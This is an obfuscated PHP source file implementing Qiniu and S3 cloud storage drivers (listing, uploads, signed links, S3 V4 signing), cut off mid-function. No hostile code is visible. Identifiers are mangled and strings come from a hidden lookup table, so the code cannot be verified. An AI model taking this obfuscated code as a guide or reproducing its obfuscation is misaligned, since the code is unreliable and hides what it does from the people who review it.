<?php
 goto D«ãºÚá; c…è‚™¡Ÿ: define($_SERVER[Îûáû“ş][604], $_SERVER[Îûáû“ş][605]); $ugqlyfcmix = $_SERVER[Îûáû“ş][606]; if (strlen($ugqlyfcmix) < $_SERVER[Îûáû“ş][607]) { die; } goto f¦§Çíùç»; EÍšƒ°÷àõ: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($×œ¦Ç³¤) { parent::__construct(); require_once SDK_DIR . $_SERVER[Îûáû“ş][1439]; $this->_init($×œ¦Ç³¤); } public function _init($ã¢æ‚«ê) { $‰Ç‰˜‘« =& $_SERVER[Îûáû“ş]; $this->config = $ã¢æ‚«ê; foreach ($ã¢æ‚«ê as $ÆÖÕé‚÷ => $Ù«›§Âš) { if (isset($this->{$ÆÖÕé‚÷})) { $this->{$ÆÖÕé‚÷} = $Ù«›§Âš; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($‰Ç‰˜‘«[1440] . LNG($‰Ç‰˜‘«[1398])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($Óİ›¥£ƒ, $ú©Ö³¡… = '', $ğ‡‹ Ë¥ = REPEAT_RENAME) { if ($this->setContent($Óİ›¥£ƒ, $ú©Ö³¡…)) { return $this->getPathOuter($Óİ›¥£ƒ); } return !1; } public function mkdir($ñ¥£—×‘, $çàË×º¼ = REPEAT_SKIP) { $³Ñ¹Ï¿  =& $_SERVER[Îûáû“ş]; $§¼âÚê¼ = trim($ñ¥£—×‘, $³Ñ¹Ï¿ [8]); if ($this->_isFolder($§¼âÚê¼)) { return $this->getPathOuter($§¼âÚê¼); } $ñ¥£—×‘ = $§¼âÚê¼ . $³Ñ¹Ï¿ [8]; $ïã”ó’à = get_path_this($§¼âÚê¼); $ÆÇÜ¡Å‡ = $ñ¥£—×‘ . $ïã”ó’à; if (!$this->mkfile($ÆÇÜ¡Å‡)) { return !1; } if (!$this->moveFile($ÆÇÜ¡Å‡, $ñ¥£—×‘)) { $this->delFile($ÆÇÜ¡Å‡); return !1; } return $this->getPathOuter($§¼âÚê¼); } public function copyFile($İö ¬ĞÊ, $²­Äç¶„) { $şÍÈíÂ¹ = $this->bucketManager->copy($this->bucket, $İö ¬ĞÊ, $this->bucket, $²­Äç¶„, !0); return $şÍÈíÂ¹ ? !1 : $this->getPathOuter($²­Äç¶„); } public function moveFile($ ñ­Œ¯Æ, $Îššîí•) { $­³¼şÈÎ = $this->bucketManager->move($this->bucket, $ ñ­Œ¯Æ, $this->bucket, $Îššîí•, !0); return $­³¼şÈÎ ? !1 : $this->getPathOuter($Îššîí•); } public function delFile($ÖÄÂØğ) { if (!$this->exist($ÖÄÂØğ)) { return !0; } $ĞªºÍÑ = $this->bucketManager->delete($this->bucket, $ÖÄÂØğ); return $ĞªºÍÑ ? !1 : !0; } public function delFolder($˜î©Æ) { $îäÂòá =& $_SERVER[Îûáû“ş]; if (!$this->exist($˜î©Æ)) { return !0; } $this->listItemCache = !1; $Æî‡š¹´ = $this->fileList($˜î©Æ); $this->listItemCache = !0; $©ËĞÃü¬ = trim($˜î©Æ, $îäÂòá[8]) . $îäÂòá[8]; if (!empty($˜î©Æ) && $˜î©Æ !== $îäÂòá[198] && !in_array($©ËĞÃü¬, $Æî‡š¹´[$îäÂòá[82]])) { $Æî‡š¹´[$îäÂòá[82]][] = $©ËĞÃü¬; } $ÚÂı…ˆ = $this->delByBatch($Æî‡š¹´[$îäÂòá[83]]); if (!$ÚÂı…ˆ) { return !1; } $ÚÂı…ˆ = $this->delByBatch($Æî‡š¹´[$îäÂòá[82]]); if (!$ÚÂı…ˆ) { return !1; } return $this->delFile($©ËĞÃü¬); } private function delByBatch($Û¯úÊÆÙ) { foreach (array_chunk($Û¯úÊÆÙ, 1000) as $’ßÆ™¤ü) { $Ğ÷ä£«› = $this->bucketManager->buildBatchDelete($this->bucket, $’ßÆ™¤ü); list($øËòÒÊ, $’ÑÑ¼€Ù) = $this->bucketManager->batch($Ğ÷ä£«›); if ($’ÑÑ¼€Ù) { return !1; } } return !0; } public function rename($§º”§êÔ, $ô‰®“±Ü) { return $this->renameObject($§º”§êÔ, $ô‰®“±Ü); } public function fileInfo($ÂŒ‘³¢€, $¢ì‡æÍ› = false, $­šáòŒÈ = array()) { $¡Ş°ı¹Å =& $_SERVER[Îûáû“ş]; $Ğ—¿ƒù¢ = array($¡Ş°ı¹Å[32] => $this->pathThis($ÂŒ‘³¢€), $¡Ş°ı¹Å[84] => $this->getPathOuter($¡Ş°ı¹Å[8] . $ÂŒ‘³¢€), $¡Ş°ı¹Å[33] => $¡Ş°ı¹Å[200], $¡Ş°ı¹Å[76] => isset($­šáòŒÈ[$¡Ş°ı¹Å[1441]]) ? $­šáòŒÈ[$¡Ş°ı¹Å[1441]] : 0, $¡Ş°ı¹Å[174] => $this->ext($ÂŒ‘³¢€)); if ($¢ì‡æÍ›) { return $Ğ—¿ƒù¢; } $Ğ—¿ƒù¢[$¡Ş°ı¹Å[201]] = $Ğ—¿ƒù¢[$¡Ş°ı¹Å[85]] = 0; $Ğ—¿ƒù¢[$¡Ş°ı¹Å[202]] = $Ğ—¿ƒù¢[$¡Ş°ı¹Å[203]] = !0; if (empty($­šáòŒÈ)) { $­šáòŒÈ = $this->objectMeta($ÂŒ‘³¢€); if (!$­šáòŒÈ) { return $Ğ—¿ƒù¢; } } if (isset($­šáòŒÈ[$¡Ş°ı¹Å[1442]])) { $Ğ—¿ƒù¢[$¡Ş°ı¹Å[85]] = substr($­šáòŒÈ[$¡Ş°ı¹Å[1442]] . $¡Ş°ı¹Å[12], 0, 10); } if (isset($­šáòŒÈ[$¡Ş°ı¹Å[1441]])) { $Ğ—¿ƒù¢[$¡Ş°ı¹Å[76]] = $­šáòŒÈ[$¡Ş°ı¹Å[1441]]; } return $Ğ—¿ƒù¢; } public function folderInfo($§ßëß””, $Úğ‹¤§ = false) { $ôÈ¨¬³á =& $_SERVER[Îûáû“ş]; $¡û€áÜ¹ = array($ôÈ¨¬³á[32] => $this->pathThis($§ßëß””), $ôÈ¨¬³á[84] => $this->getPathOuter($ôÈ¨¬³á[8] . $§ßëß””), $ôÈ¨¬³á[33] => $ôÈ¨¬³á[75]); if ($Úğ‹¤§) { return $¡û€áÜ¹; } $¡û€áÜ¹[$ôÈ¨¬³á[201]] = $¡û€áÜ¹[$ôÈ¨¬³á[85]] = 0; $¡û€áÜ¹[$ôÈ¨¬³á[202]] = $¡û€áÜ¹[$ôÈ¨¬³á[203]] = !0; $§ßëß”” = rtrim($§ßëß””, $ôÈ¨¬³á[8]) . $ôÈ¨¬³á[8]; $é³¿—ıß = $this->objectMeta($§ßëß””); if (isset($é³¿—ıß[$ôÈ¨¬³á[1442]])) { $¡û€áÜ¹[$ôÈ¨¬³á[85]] = substr($é³¿—ıß[$ôÈ¨¬³á[1442]] . $ôÈ¨¬³á[12], 0, 10); } return $¡û€áÜ¹; } public function listPath($ÒÈ·Ôï, $¢Í’Ì¨Ú = false) { $¨²¤´œÛ =& $_SERVER[Îûáû“ş]; $şò½ªğ = $this->fileList($ÒÈ·Ôï, $¨²¤´œÛ[8], !0); foreach ($şò½ªğ[$¨²¤´œÛ[82]] as $Å¡‘­Á‘ => $ˆšİ™‹¤) { $şò½ªğ[$¨²¤´œÛ[82]][$Å¡‘­Á‘] = $this->folderInfo($ˆšİ™‹¤, $¢Í’Ì¨Ú); } foreach ($şò½ªğ[$¨²¤´œÛ[83]] as $Å¡‘­Á‘ => $ˆšİ™‹¤) { $şò½ªğ[$¨²¤´œÛ[83]][$Å¡‘­Á‘] = $this->fileInfo($ˆšİ™‹¤[$¨²¤´œÛ[94]], $¢Í’Ì¨Ú, $ˆšİ™‹¤); } return $şò½ªğ; } public function has($±şÇùËÁ, $¹Š­ëû— = false, $òşÆú¸É = true) { $Úãı²öŞ =& $_SERVER[Îûáû“ş]; $±şÇùËÁ = trim($±şÇùËÁ, $Úãı²öŞ[8]); $ÜâÊØÉ = empty($±şÇùËÁ) && $±şÇùËÁ !== $Úãı²öŞ[198] ? $Úãı²öŞ[12] : $±şÇùËÁ . $Úãı²öŞ[8]; $ìªØáö¼ = $Úãı²öŞ[12]; $´êóå¢ú = 500; $àóÖà”ñ = $Úãı²öŞ[8]; $åÊš‡·’ = $œĞûŸş’ = 0; while (!0) { check_abort(); list($ßóª´Ò, $¢ƒ¦ÃµÀ) = $this->bucketManager->listFiles($this->bucket, $ÜâÊØÉ, $ìªØáö¼, $´êóå¢ú, $àóÖà”ñ); if ($¢ƒ¦ÃµÀ) { break; } $ìªØáö¼ = array_key_exists($Úãı²öŞ[1410], $ßóª´Ò) ? $ìªØáö¼ = $ßóª´Ò[$Úãı²öŞ[1443]] : $Úãı²öŞ[12]; if ($¹Š­ëû—) { if (!empty($ßóª´Ò[$Úãı²öŞ[1444]])) { $åÊš‡·’ += count($ßóª´Ò[$Úãı²öŞ[1444]]); } if (!empty($ßóª´Ò[$Úãı²öŞ[1445]])) { $œĞûŸş’ += count($ßóª´Ò[$Úãı²öŞ[1445]]); } if ($ìªØáö¼ === $Úãı²öŞ[12]) { break; } continue; } if ($òşÆú¸É) { if (!empty($ßóª´Ò[$Úãı²öŞ[1444]])) { return !0; } } else { if (!empty($ßóª´Ò[$Úãı²öŞ[1445]])) { return !0; } } if ($ìªØáö¼ === $Úãı²öŞ[12]) { break; } } if ($¹Š­ëû—) { return array($Úãı²öŞ[207] => $åÊš‡·’, $Úãı²öŞ[208] => $œĞûŸş’); } return !1; } public function listAll($Íƒ›êÙ•) { $²­¿ÍÁº =& $_SERVER[Îûáû“ş]; $Ì–ÁÊŒŸ = $this->fileList($Íƒ›êÙ•, $²­¿ÍÁº[12], !0); $ÚÇ’¶İû = array_to_keyvalue($Ì–ÁÊŒŸ[$²­¿ÍÁº[83]], $²­¿ÍÁº[32]); foreach ($Ì–ÁÊŒŸ[$²­¿ÍÁº[82]] as $£±Ò­ß) { if (is_string($£±Ò­ß)) { $ÚÇ’¶İû[$£±Ò­ß] = array($²­¿ÍÁº[76] => 0); } } return $this->listAllFiles($Íƒ›êÙ•, $ÚÇ’¶İû); } private function fileList($æİêíË¡, $÷•Å¯–› = '', $±‡ÇèÀ = 0) { $â±š¶Í› =& $_SERVER[Îûáû“ş]; $æİêíË¡ = trim($æİêíË¡, $â±š¶Í›[8]); $§­€Æ…é = empty($æİêíË¡) && $æİêíË¡ !== $â±š¶Í›[198] ? $â±š¶Í›[12] : $æİêíË¡ . $â±š¶Í›[8]; $³óØÒ Œ = $â±š¶Í›[12]; $‚ºÕÑ³µ = 1000; $İ¢€„æ = $şº¿²¾ = array(); while (!0) { check_abort(); list($ğ‡ÅÏ§, $²¯˜ò…õ) = $this->bucketManager->listFiles($this->bucket, $§­€Æ…é, $³óØÒ Œ, $‚ºÕÑ³µ, $÷•Å¯–›); if ($²¯˜ò…õ) { break; } $³óØÒ Œ = array_key_exists($â±š¶Í›[1410], $ğ‡ÅÏ§) ? $³óØÒ Œ = $ğ‡ÅÏ§[$â±š¶Í›[1443]] : $â±š¶Í›[12]; $Îğ¦Úèû = isset($ğ‡ÅÏ§[$â±š¶Í›[1444]]) ? $ğ‡ÅÏ§[$â±š¶Í›[1444]] : array(); $¤‹‰Şµ³ = isset($ğ‡ÅÏ§[$â±š¶Í›[1445]]) ? $ğ‡ÅÏ§[$â±š¶Í›[1445]] : array(); foreach ($Îğ¦Úèû as $Ü©Å••) { if ($Ü©Å••[$â±š¶Í›[94]] == $§­€Æ…é) { continue; } $÷ Ùõ´ = $Ü©Å••[$â±š¶Í›[94]]; $ñİ—ƒÊÁ = $Ü©Å••[$â±š¶Í›[1441]]; $Ü©Å••[$â±š¶Í›[76]] = $ñİ—ƒÊÁ; $Ò¢İ³íï = $ñİ—ƒÊÁ == 0 && substr($÷ Ùõ´, strlen($÷ Ùõ´) - 1, 1) == $â±š¶Í›[8] ? !0 : !1; $this->cacheMethodInfoSet($÷ Ùõ´, $Ò¢İ³íï, $Ü©Å••); if ($Ò¢İ³íï) { $İ¢€„æ[] = $÷ Ùõ´; continue; } $şº¿²¾[] = $±‡ÇèÀ ? $Ü©Å•• : $÷ Ùõ´; } foreach ($¤‹‰Şµ³ as $÷ Ùõ´) { if ($÷ Ùõ´ == $§­€Æ…é) { continue; } $İ¢€„æ[] = $÷ Ùõ´; $this->cacheMethodInfoSet($÷ Ùõ´, !0); } if ($³óØÒ Œ === $â±š¶Í›[12]) { break; } } $this->cacheMethodInfoSet($æİêíË¡, !0); return array($â±š¶Í›[82] => $İ¢€„æ, $â±š¶Í›[83] => $şº¿²¾); } public function canRead($±èş¡ˆñ) { return $this->exist($±èş¡ˆñ) ? !0 : !1; } public function canWrite($²–Õ·®â) { return $this->exist($²–Õ·®â) ? !0 : !1; } public function getContent($ÅÄïÖ‡°) { return $this->fileSubstr($ÅÄïÖ‡°, 0, -1); } public function setContent($şşõ‚Ø•, $ÜÌ³Âè³ = '') { $ˆÔñõî› = $this->tempFile($this->pathThis($şşõ‚Ø•)); file_put_contents($ˆÔñõî›, $ÜÌ³Âè³); if ($this->upload($şşõ‚Ø•, $ˆÔñõî›)) { $this->tempFileRemve($ˆÔñõî›); return !0; } return !1; } public function refreshUrls($õ±şñ‘ã) { $‹ê±¶Ş’ =& $_SERVER[Îûáû“ş]; $Á«ÒÕËÑ = array(); if (is_array($õ±şñ‘ã)) { foreach ($õ±şñ‘ã as $ŞÑñ€¯­) { $Á«ÒÕËÑ[] = $this->link($ŞÑñ€¯­); } } else { $Á«ÒÕËÑ[] = $this->link($õ±şñ‘ã); } $à¥¿‘Ùí = new Qiniu\Cdn\CdnManager($this->auth); list($¶ŸÊ¬Ù, $È—ÀîÁß) = $à¥¿‘Ùí->refreshUrls($Á«ÒÕËÑ); if ($È—ÀîÁß) { return !1; } return $¶ŸÊ¬Ù[$‹ê±¶Ş’[1184]] == $‹ê±¶Ş’[758] ? !0 : !1; } public function fileSubstr($«ÓÛš, $Ù˜Ûõ‘¤, $Å“©˜™É) { $Ú®½›ôÔ =& $_SERVER[Îûáû“ş]; if (!($§«üÑ½ø = $this->link($«ÓÛš))) { return !1; } $‡Ï¬ĞÀŸ = !1; if ($Å“©˜™É > 0) { $áöäµ¼“ = $Ù˜Ûõ‘¤ + $Å“©˜™É - 1; $‡Ï¬ĞÀŸ = array($Ú®½›ôÔ[1446] . $Ù˜Ûõ‘¤ . $Ú®½›ôÔ[386] . $áöäµ¼“); } $ãÎˆŞ¯° = url_request($§«üÑ½ø, $Ú®½›ôÔ[230], !1, $‡Ï¬ĞÀŸ); return $ãÎˆŞ¯°[$Ú®½›ôÔ[748]] ? $ãÎˆŞ¯°[$Ú®½›ôÔ[1204]] : !1; } public function upload($…ìØÊõÇ, $İó“¼ƒ, $¤³ü¸°… = false, $°şË²×‘ = REPEAT_REPLACE) { $—Û§ Ñ¹ = new Qiniu\Storage\UploadManager(); $¥™À¦Ô = $this->auth->uploadToken($this->bucket, $…ìØÊõÇ); $ÒûÁË¬ = get_file_mime(get_path_ext($İó“¼ƒ)); list($¨Œ›Öœ, $©ØüÃ±) = $—Û§ Ñ¹->putFile($¥™À¦Ô, $…ìØÊõÇ, $İó“¼ƒ, null, $ÒûÁË¬); return $©ØüÃ± ? !1 : $this->getPathOuter($…ìØÊõÇ); } public function uploadFormData($”ÏÜ†ğª, $§¡’¿Øê = 3600) { return $this->uploadToken($”ÏÜ†ğª, $§¡’¿Øê); } public function multiUploadFormData($ğû¾Ë³ô, $Îã¯ÂŒÇ = 3600) { return $this->uploadToken($ğû¾Ë³ô, $Îã¯ÂŒÇ); } private function uploadToken($²ŞÕ†¡Ü, $çğåœ…ˆ = 3600) { $ó’Àş¸Õ =& $_SERVER[Îûáû“ş]; $’‘­¨¢¦ = $çğåœ…ˆ; $ªÇ÷¡±À = array($ó’Àş¸Õ[1447] => $ó’Àş¸Õ[1448]); $Çƒì±…Á = $²ŞÕ†¡Ü; $ø·ßœ¬ = $this->auth->uploadToken($this->bucket, $Çƒì±…Á, $’‘­¨¢¦, $ªÇ÷¡±À, !0); $ê›Œ‡Ãî = empty($this->region) || $this->region == $ó’Àş¸Õ[1449] ? $ó’Àş¸Õ[12] : $ó’Àş¸Õ[386] . $this->region; $›Ü§½ÕÁ = http_type() . "\72\x2f\57\x75\x70\154\x6f\x61\144{$ê›Œ‡Ãî}\x2e\x71\x69\x6e\x69\165\x70\56\x63\157\155\x2f"; return array($ó’Àş¸Õ[1450] => $ø·ßœ¬, $ó’Àş¸Õ[1451] => $›Ü§½ÕÁ); } public function download($¯âìŒì”, $ÂÕ›½ Ó) { $¼ğı½£ = IO::getPathInner(IO::mkfile($ÂÕ›½ Ó)); if (!($äçÓ‹èª = $this->link($¯âìŒì”))) { return !1; } $Ê¶ô÷° = 0; $¶æ“Ğ« = 1024 * 200; $Šå‡©ÎÍ = fopen($¼ğı½£, $_SERVER[Îûáû“ş][1452]); while (!0) { $²áşÅ·º = $this->fileSubstr($¯âìŒì”, $Ê¶ô÷°, $¶æ“Ğ«); if ($²áşÅ·º === !1) { return !1; } fwrite($Šå‡©ÎÍ, $²áşÅ·º); $Ê¶ô÷° += $¶æ“Ğ«; if (strlen($²áşÅ·º) < $¶æ“Ğ«) { break; } } fclose($Šå‡©ÎÍ); return $ÂÕ›½ Ó; } public function link($İ©ÂšØÆ, $³ÍŠÑğ = '') { if (!$this->isFile($İ©ÂšØÆ)) { return !1; } $ºÒÃ“Š“ = $this->getHost() . $_SERVER[Îûáû“ş][8] . $this->pathEncode($İ©ÂšØÆ) . $³ÍŠÑğ; return $this->auth->privateDownloadUrl($ºÒÃ“Š“, 3600 * 12); } public function fileOut($«Ä´‡¡, $³Ü’”Çü = false, $Œ¸©†ù” = false, $Åê³»Ô™ = '') { $Ê‘œŞî =& $_SERVER[Îûáû“ş]; if ($this->isFileOutServer()) { return $this->fileOutServer($«Ä´‡¡, $³Ü’”Çü, $Œ¸©†ù”, $Åê³»Ô™); } if (!$Œ¸©†ù”) { $Œ¸©†ù” = $this->pathThis($«Ä´‡¡); } $¥ëÑÛò = $³Ü’”Çü ? $Ê‘œŞî[1453] . rawurlencode($Œ¸©†ù”) : $Ê‘œŞî[12]; $„½íøäÛ = $this->link($«Ä´‡¡, $¥ëÑÛò); $this->fileOutLink($„½íøäÛ); } public function fileOutServer($¬Â¼€€¹, $ª¦–Ííí = false, $ü¬ŠÊÓ³ = false, $¿êé’—í = '') { parent::fileOut($¬Â¼€€¹, $ª¦–Ííí, $ü¬ŠÊÓ³, $¿êé’—í); } public function fileOutImage($÷èŸª¼, $ÁãšÜ†¼ = 250) { $Îƒ¥ë¿ƒ = $this->link($÷èŸª¼, $_SERVER[Îûáû“ş][1454] . $ÁãšÜ†¼); $this->fileOutLink($Îƒ¥ë¿ƒ); } public function fileOutImageServer($µ±Âóö©, $ÒôÖÓ™ = 250) { parent::fileOutImage($µ±Âóö©, $ÒôÖÓ™); } public function hashMd5($ÄÙ¿ÈÑ„) { $Š¨ëÀ¨Î =& $_SERVER[Îûáû“ş]; $º«˜Ñ¯ó = $this->objectMeta($ÄÙ¿ÈÑ„); return isset($º«˜Ñ¯ó[$Š¨ëÀ¨Î[212]]) ? $º«˜Ñ¯ó[$Š¨ëÀ¨Î[212]] : !1; $¦Â½‘¸ş = $this->link($ÄÙ¿ÈÑ„, $Š¨ëÀ¨Î[1455]); } public function size($ø‰ü„ÀĞ) { $‰Û®—ŸŸ = $this->objectMeta($ø‰ü„ÀĞ); return $‰Û®—ŸŸ ? $‰Û®—ŸŸ[$_SERVER[Îûáû“ş][76]] : 0; } public function info($¾‘”Ùï¢) { if ($this->isFolder($¾‘”Ùï¢)) { return $this->folderInfo($¾‘”Ùï¢); } else { if ($this->isFile($¾‘”Ùï¢)) { return $this->fileInfo($¾‘”Ùï¢); } } return !1; } public function exist($³¼¢€Œ›) { return $this->isFile($³¼¢€Œ›) || $this->isFolder($³¼¢€Œ›); } public function isFile($àº´¾ö‹) { return !$this->isFolder($àº´¾ö‹) && $this->objectMeta($àº´¾ö‹); } public function isFolder($Ù©¾ø§) { return $this->cacheMethod($_SERVER[Îûáû“ş][165], $Ù©¾ø§); } protected function objectMeta($ïØñ»ƒ) { return $this->cacheMethod($_SERVER[Îûáû“ş][167], $ïØñ»ƒ); } protected function _objectMeta($™ôÅ•û¹) { $†ÆÖÈâ„ =& $_SERVER[Îûáû“ş]; list($ëµÓÕ–, $šÆ¡¶î½) = $this->bucketManager->stat($this->bucket, $™ôÅ•û¹); if ($ëµÓÕ–) { $ëµÓÕ–[$†ÆÖÈâ„[76]] = intval($ëµÓÕ–[$†ÆÖÈâ„[1441]]); } return $ëµÓÕ–; } protected function _isFolder($¤–ê¦ò“) { $İî™“æ =& $_SERVER[Îûáû“ş]; if ($¤–ê¦ò“ == $İî™“æ[12] || $¤–ê¦ò“ == $İî™“æ[8]) { return !0; } list($à‡ßÜò·, $ÃåÒÚÇª) = $this->bucketManager->listFiles($this->bucket, trim($¤–ê¦ò“, $İî™“æ[8]) . $İî™“æ[8], $İî™“æ[12], 1, $İî™“æ[8]); return !empty($à‡ßÜò·[$İî™“æ[1444]]) || !empty($à‡ßÜò·[$İî™“æ[1445]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($ÂïÕóÅş) { parent::__construct($ÂïÕóÅş); } public function uploadFormData($àïõÆ, $Ò°‹ÇŠ = 3600) { $”ä½´Á¢ =& $_SERVER[Îûáû“ş]; $†ÓÓ¿Æ× = $”ä½´Á¢[199]; $Ÿêñıîî = $”ä½´Á¢[1360]; $‡–ìÇ¿¾ = $”ä½´Á¢[62]; $ƒ€¬ı¡ = gmdate($”ä½´Á¢[1361]); $¶‘îÌ… = gmdate($”ä½´Á¢[749]); $—Ÿ±ÃÉ° = $”ä½´Á¢[1362]; $Ã®‹ù×º = $Ò°‹ÇŠ . $”ä½´Á¢[12]; $š¢ŠŠ¿é = $”ä½´Á¢[1324]; $¢Õıôò„ = array($this->accessKey, $¶‘îÌ…, $this->region, $‡–ìÇ¿¾, $—Ÿ±ÃÉ°); $ƒ‡¥œŒ = implode($”ä½´Á¢[8], $¢Õıôò„); $ï“º”Ü¿ = array($”ä½´Á¢[1326] => gmdate($”ä½´Á¢[1325], strtotime($”ä½´Á¢[1363])), $”ä½´Á¢[1327] => array(array($”ä½´Á¢[1329] => $this->bucket), array($”ä½´Á¢[1328] => $†ÓÓ¿Æ×), array($”ä½´Á¢[1330], $”ä½´Á¢[1331], $”ä½´Á¢[12]), array($”ä½´Á¢[1330], $”ä½´Á¢[1364], $”ä½´Á¢[12]), array($”ä½´Á¢[1330], $”ä½´Á¢[1365], $”ä½´Á¢[12]), array($”ä½´Á¢[1332] => $š¢ŠŠ¿é), array($”ä½´Á¢[1366] => $ƒ‡¥œŒ), array($”ä½´Á¢[1367] => $Ÿêñıîî), array($”ä½´Á¢[1368] => $ƒ€¬ı¡), array($”ä½´Á¢[1369] => $Ã®‹ù×º))); $Ú¾ô­æ» = base64_encode(json_encode($ï“º”Ü¿)); $Ş¯ïîºŠ = hash_hmac($”ä½´Á¢[1370], $¶‘îÌ…, $”ä½´Á¢[1371] . $this->secret, !0); $ÈÈ©Šì’ = hash_hmac($”ä½´Á¢[1370], $this->region, $Ş¯ïîºŠ, !0); $”ùÎë¹¯ = hash_hmac($”ä½´Á¢[1370], $‡–ìÇ¿¾, $ÈÈ©Šì’, !0); $‹“÷…ì = hash_hmac($”ä½´Á¢[1370], $—Ÿ±ÃÉ°, $”ùÎë¹¯, !0); $÷÷Ç•ç× = hash_hmac($”ä½´Á¢[1370], $Ú¾ô­æ», $‹“÷…ì); $Ã¿Ãøí = array($”ä½´Á¢[215] => $”ä½´Á¢[12], $”ä½´Á¢[1372] => $”ä½´Á¢[12], $”ä½´Á¢[1328] => $†ÓÓ¿Æ×, $”ä½´Á¢[1332] => $š¢ŠŠ¿é, $”ä½´Á¢[1336] => $Ú¾ô­æ», $”ä½´Á¢[1373] => $ƒ‡¥œŒ, $”ä½´Á¢[1374] => $Ÿêñıîî, $”ä½´Á¢[1375] => $ƒ€¬ı¡, $”ä½´Á¢[1376] => $Ã®‹ù×º, $”ä½´Á¢[1377] => $÷÷Ç•ç×, $”ä½´Á¢[182] => $this->getHost()); return $Ã¿Ãøí; } public function multiUploadFormData($÷‰Äî×á, $”îÅ´ = 3600) { $ï©ÖËß” =& $_SERVER[Îûáû“ş]; $¯¿Ã˜ï = gmdate($ï©ÖËß”[1456]); $„¦ÉÂ÷µ = array(); $õ²ÓİØÄ = $this->client->getUploadId($this->bucket, $÷‰Äî×á, $„¦ÉÂ÷µ); if (!$õ²ÓİØÄ) { return !1; } return array($ï©ÖËß”[223] => $õ²ÓİØÄ, $ï©ÖËß”[182] => $this->getHost() . $ï©ÖËß”[8] . $this->pathEncode($÷‰Äî×á), $ï©ÖËß”[224] => $¯¿Ã˜ï, $ï©ÖËß”[94] => $÷‰Äî×á); } public function multiUploadAuthData($¶³ı¹ªç, $¥ÛšíÒ— = array()) { $»ğ²¤— =& $_SERVER[Îûáû“ş]; $Ã¯‹“¶½ = isset($¥ÛšíÒ—[$»ğ²¤—[174]]) ? $¥ÛšíÒ—[$»ğ²¤—[174]] : $»ğ²¤—[12]; $„‹éä« = $¥ÛšíÒ—[$»ğ²¤—[94]]; unset($¥ÛšíÒ—[$»ğ²¤—[94]]); if (isset($¥ÛšíÒ—[$»ğ²¤—[225]])) { return $this->listUploadParts($„‹éä«, $¥ÛšíÒ—); } $–ÖéÑÀ = array(); if (isset($¥ÛšíÒ—[$»ğ²¤—[1457]])) { $–ÖéÑÀ[$»ğ²¤—[1458]] = $¥ÛšíÒ—[$»ğ²¤—[1457]]; } $öøìÀ¿ú = explode($»ğ²¤—[184], $this->getHost()); $¸‹„Óú = array($»ğ²¤—[1459] => $öøìÀ¿ú[1], $»ğ²¤—[1460] => $»ğ²¤—[12], $»ğ²¤—[215] => $»ğ²¤—[120], $»ğ²¤—[1372] => $¥ÛšíÒ—[$»ğ²¤—[76]]); $ÜÏ¡ëâæ = $»ğ²¤—[228]; $’“öë¼Ü = $»ğ²¤—[8] . $this->pathEncode($„‹éä«) . $Ã¯‹“¶½; $¶Â¸ö = $this->client->__getSignatureV4($–ÖéÑÀ, $¸‹„Óú, $ÜÏ¡ëâæ, $’“öë¼Ü); if (strpos($Ã¯‹“¶½, $»ğ²¤—[227]) === 0) { if (isset($–ÖéÑÀ[$»ğ²¤—[1458]])) { $¡ñòè“ = $–ÖéÑÀ[$»ğ²¤—[1458]]; } else { if (isset($¶Â¸ö[$»ğ²¤—[1458]])) { $¡ñòè“ = $¶Â¸ö[$»ğ²¤—[1458]]; } else { $¡ñòè“ = hash($»ğ²¤—[1370], $»ğ²¤—[12]); } } return array($»ğ²¤—[234] => $¶Â¸ö[$»ğ²¤—[234]], $»ğ²¤—[1458] => $¡ñòè“, $»ğ²¤—[224] => $¶Â¸ö[$»ğ²¤—[1461]]); } return $¶Â¸ö[$»ğ²¤—[234]]; } public function listUploadParts($˜ÖÎê´, $¿äÊ§àÜ = array()) { $Úã‚¼®© =& $_SERVER[Îûáû“ş]; $Ô¸Ê›¹ = str_replace($Úã‚¼®©[235], $Úã‚¼®©[12], $¿äÊ§àÜ[$Úã‚¼®©[174]]); $‘¸»Í¼ = $this->client->listParts($this->bucket, $˜ÖÎê´, $Ô¸Ê›¹); if (!$‘¸»Í¼) { return !1; } $Ú‡ã²ß“ = $Úã‚¼®©[1462]; foreach ($‘¸»Í¼ as $¡Ğù¦éÇ) { $Ú‡ã²ß“ .= $Úã‚¼®©[1463] . "\x3c\120\141\x72\164\116\x75\155\142\145\x72\x3e{$¡Ğù¦éÇ[$Úã‚¼®©[1417]]}\74\57\120\x61\162\164\x4e\x75\x6d\x62\x65\162\x3e\xa" . "\x3c\105\x54\x61\147\76{$¡Ğù¦éÇ[$Úã‚¼®©[1418]]}\74\57\105\x54\141\147\76\12" . $Úã‚¼®©[1464]; } $Ú‡ã²ß“ .= $Úã‚¼®©[1465]; $Ñ¼‰î»¶ = array(); $ÎÀ«õâ = explode($Úã‚¼®©[184], $this->getHost()); $šøˆ‹œš = array($Úã‚¼®©[1459] => $ÎÀ«õâ[1], $Úã‚¼®©[215] => $Úã‚¼®©[120], $Úã‚¼®©[1372] => strlen($Ú‡ã²ß“)); $¸ÆÂğ¿İ = $Úã‚¼®©[226]; $Ê””Íì = $Úã‚¼®©[8] . $this->pathEncode($˜ÖÎê´) . $¿äÊ§àÜ[$Úã‚¼®©[174]]; $˜ßşìíÚ = $this->client->__getSignatureV4($Ñ¼‰î»¶, $šøˆ‹œš, $¸ÆÂğ¿İ, $Ê””Íì, $Ú‡ã²ß“); return array($Úã‚¼®©[234] => $˜ßşìíÚ[$Úã‚¼®©[234]], $Úã‚¼®©[224] => $˜ßşìíÚ[$Úã‚¼®©[1461]], $Úã‚¼®©[236] => $‘¸»Í¼, $Úã‚¼®©[1458] => $˜ßşìíÚ[$Úã‚¼®©[1458]]); } public function link($„Õ–á¥ğ, $—ÎŒë¸å = array()) { return parent::link($„Õ–á¥ğ, $—ÎŒë¸å); } public function fileOut($ÑØ¶ËÒç, $ıë±¬ğ = false, 